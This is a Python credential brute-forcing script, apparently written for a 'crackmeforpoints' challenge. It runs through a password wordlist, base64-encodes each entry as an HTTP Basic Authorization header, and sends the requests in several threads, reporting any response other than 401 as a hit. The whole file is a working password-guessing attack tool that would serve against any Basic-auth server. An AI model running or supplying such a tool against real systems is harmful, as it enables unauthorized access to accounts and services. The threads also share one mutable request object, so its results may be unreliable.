import argparse
import ssl
import http.client
from urllib.parse import urlparse
import RequestClass
import queue
import threading
import base64
import progressbar
import time


# global variables
q= queue.Queue()
queue_max_size=0
progress=0
progressbar

####### The actual function to be implemented. it takes the request and the item
# which is used to change the request in the desired way
def do_work(request,item):
    request.remove_header("Authorization")
    request.add_header("Authorization",item)


######### once the request has been sent, the response can be processed
def process_response(response):
    if response.status !=401:
        print("Response status:", response.status)

#### the source function is responsible for returning a enumerable set of items
# each of which is processed in the do_work function
def source():
    output=[]
    index=0
    with open('crackmeforpoints_password.lst',"r") as pass_file:
        for line in pass_file:
            output.append("Basic "+base64.b64encode(line.encode('utf-8')).decode('utf-8'))
            index+=1
    global queue_max_size
    queue_max_size=index
    global progressbar
    progressbar = progressbar.ProgressBar(
        widgets=[progressbar.Percentage(), progressbar.Bar()],
        maxval=queue_max_size,
    ).start()
    #print ("Max:", queue_max_size)
    return output

#each worker is in a different thread
def worker(req, proxy_port, verbose):
    global progress
    global progressbar
    while True:
        item = q.get()
        if item is None:
            break
        progressbar.update(queue_max_size-q.qsize())

        #function to be filled
        do_work(req,item)

        #send the request
        if proxy_port:
            response=req.send_request(proxy_port)
        else:
            response=req.send_request(0)

        # function to be filled
        process_response(response)
        if verbose:
            req.display_state()
            print("Response:",response.read())

        q.task_done()


def main():
    parser = argparse.ArgumentParser(description="send a HTTP(S) request")
    parser.add_argument("-p", "--proxy_port", help="send the request to localhost proxy on specified port. If not specified, no proxy will be used.",type=str)
    parser.add_argument("-f", "--request_file", help="file containing the request.\n If not specified the file named 'request' in current dir will be used.",type=str)
    parser.add_argument("-v", "--verbose", help="display request information",action="store_true")
    parser.add_argument("-t", "--threads", help="The number of thread, if not specified only one thread is used",type=int )
    args = parser.parse_args()

    req=RequestClass.Request()
    response=None
    nb_threads=1
    threads= []

    if args.request_file:
        req.parse_request_from_file(args.request_file)
    else:
        req.parse_request_from_file("request")

    if args.threads:
        nb_threads=args.threads

    start=time.time()

    for i in range(nb_threads):
        t = threading.Thread(target=worker,args=(req,args.proxy_port,args.verbose))
        t.start()
        threads.append(t)

    for item in source():
        q.put(item)

    # block until all tasks are done
    q.join()

    # stop workers
    for i in range(nb_threads):
        q.put(None)
    for t in threads:
        t.join()

    global progressbar
    progressbar.finish()
    end=time.time()
    print("Time elapsed : ",round(end-start))

if __name__ == "__main__" :
    main()
